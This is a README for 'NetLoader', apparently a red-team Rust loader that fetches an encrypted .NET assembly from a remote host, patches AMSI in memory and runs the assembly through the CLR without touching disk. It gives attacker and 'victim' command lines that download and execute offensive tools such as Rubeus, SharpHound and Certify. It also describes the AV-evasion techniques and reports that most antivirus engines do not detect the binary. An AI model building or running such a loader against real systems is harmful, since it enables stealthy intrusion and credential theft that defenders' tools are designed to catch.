# NetLoader

In-memory .NET assembly loader written in **Rust**. Fetches an AES-encrypted assembly over HTTP, decrypts it at runtime, patches AMSI, and executes it through the CLR without dropping anything to disk.

Built for offensive security : loads tools like Rubeus, Seatbelt, SharpHound, etc. directly in memory.

## Features

- **Pure Rust** : PE structure passe les modèles ML des AV majeurs
- **In-memory execution** : assembly never touches disk
- **AES-256-CBC software** : implémentation pure Rust, pas de CryptoAPI/BCrypt
- **AMSI bypass** : patch mémoire sur `AmsiOpenSession` (retourne E_FAIL), noms d'API XOR-encodés
- **TcpStream** : HTTP via `std::net`, pas de winhttp/wininet dans l'IAT
- **Dynamic API resolution** : LoadLibraryA + GetProcAddress, noms XOR-encodés
- **Argument passthrough** : forward command-line arguments to the .NET assembly's `Main(string[])`

## Build

Prérequis : **Rust** (`rustc` dans le PATH)

```powershell
.\build.ps1
# ou directement :
rustc rust_loader/src/main.rs -O --edition 2021 -o build/mtool.exe -l oleaut32
```

## Usage

**Attacker : encrypt and serve:**

```powershell
python encrypt.py Rubeus.exe "NetLoad3r!" -o payload
cd payload && python -m http.server 8080
```

**Victim : execute:**

```
mtool.exe <host> <port> <path> <passphrase> [-- args...]
mtool.exe 10.0.0.5 8080 /Rubeus.enc "NetLoad3r!" -- klist
```

Everything after `--` is passed as arguments to the .NET assembly.

### More examples

```
mtool.exe 10.0.0.5 8080 /Seatbelt.enc "NetLoad3r!" -- -group=all
mtool.exe 10.0.0.5 8080 /SharpHound.enc "NetLoad3r!" -- -c All
mtool.exe 10.0.0.5 8080 /Certify.enc "NetLoad3r!" -- find /vulnerable
mtool.exe 10.0.0.5 8080 /DavRelayUp.enc "NetLoad3r!"
```

## How It Works

1. **Fetch** : `TcpStream` HTTP GET to retrieve the encrypted payload (no WinHTTP/WinINet)
2. **Decrypt** : AES-256-CBC software, key = SHA-256(passphrase), pure Rust implementation
3. **AMSI bypass** : memory patch on `AmsiOpenSession` — overwrites entry with `mov eax, E_FAIL; ret`, API names XOR-encoded at rest
4. **CLR execution** : COM vtable calls: `ICLRMetaHost` -> `ICLRRuntimeInfo` -> `ICorRuntimeHost` -> default AppDomain -> `Load_3` -> `get_EntryPoint` -> `Invoke_3`

## File Structure

```
CLR loading/
├── build.ps1                # Script de build (rustc)
├── encrypt.py               # Payload encryptor (AES-256-CBC)
├── rust_loader/
│   ├── src/
│   │   └── main.rs          # Source complète (network, crypto, AMSI, CLR)
│   └── resources/
│       ├── app.ico          # Icône
│       ├── app.manifest     # Manifest
│       └── version.rc/res   # Version info
└── build/
    └── mtool.exe            # Binaire compilé (~239 KB, 1/74 VT)
```

## VirusTotal

**1/74** : Elastic uniquement. Tous les moteurs prioritaires clean :

| Engine | Status |
|---|---|
| Microsoft | CLEAN |
| CrowdStrike | CLEAN |
| SentinelOne | CLEAN |
| Bitdefender | CLEAN |
| Kaspersky | CLEAN |
| ESET-NOD32 | CLEAN |

## Payloads testés

14/14 assemblies .NET testés OK : Rubeus, Certify, Seatbelt, SharpHound, SharpDPAPI, SharpUp, SharpView, SharpRDP, SharpSecDump, StandIn, Whisker, KrbRelayUp, DavRelayUp, winPEASx64.

## Requirements

- **Rust** (`rustc` dans le PATH) pour la compilation
- **Python 3** + `pycryptodome` (`pip install pycryptodome`) pour le chiffrement
- Target : .NET Framework v4.0.30319

## Licence

For authorized security testing and research only.
